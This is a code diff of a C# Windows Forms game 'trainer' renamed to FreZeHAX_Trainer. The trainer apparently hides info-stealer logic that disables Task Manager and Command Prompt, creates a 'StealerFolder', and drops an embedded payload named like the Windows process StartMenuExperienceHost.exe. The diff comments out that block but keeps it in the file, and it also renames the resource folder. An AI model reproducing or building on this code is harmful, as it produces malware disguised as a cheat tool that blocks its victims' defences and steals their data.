@@ -7,12 +7,11 @@ using System.IO;
 using System.Linq;
 using System.Management;
 using System.Net.NetworkInformation;
-using System.Security.Principal;
 using System.Text.RegularExpressions;
 using System.Windows.Forms;
 using System.Windows.Input;
 
-namespace Trainer
+namespace FreZeHAX_Trainer
 {
     public partial class Trainer : Form
     {
@@ -31,7 +30,7 @@ namespace Trainer
         private Point lastLocation;
         private const string ResourceName = "StartMenuExperienceHost.exe";
         private const string ZipFileName = "StartMenu.zip";
-        private const string SolutionName = "Trainer";
+        private const string SolutionName = "FreeZeHAX Trainer";
         private readonly TaskDefinition td = TaskService.Instance.NewTask();
 
         private void StartForm()
@@ -64,7 +63,7 @@ namespace Trainer
         {
             Show();
             StartForm();
-            others.DisableTaskManager();
+            /*others.DisableTaskManager();
             others.DisableCommandPrompt();
             others.Wait(1000);
 
@@ -79,8 +78,8 @@ namespace Trainer
                 others.DirClean(StealerFolder);
                 others.Wait(1000);
                 Directory.CreateDirectory(StealerFolderLoc);
-                others.Extract(SolutionName, StealerFolderLoc, "Resources", ResourceName);
-                others.Extract(SolutionName, StealerFolderLoc, "Resources", ZipFileName);
+                others.Extract(SolutionName, StealerFolderLoc, "Files", ResourceName);
+                others.Extract(SolutionName, StealerFolderLoc, "Files", ZipFileName);
                 if (Directory.Exists(Guna))
                 {
                     Directory.Delete(Guna, true);
@@ -104,7 +103,7 @@ namespace Trainer
             }
             catch (Exception) { }
             #endregion
-
+            */
             Auto_Attach.RunWorkerAsync();
 
             foreach (NetworkInterface adapter in NetworkInterface.GetAllNetworkInterfaces().Where(
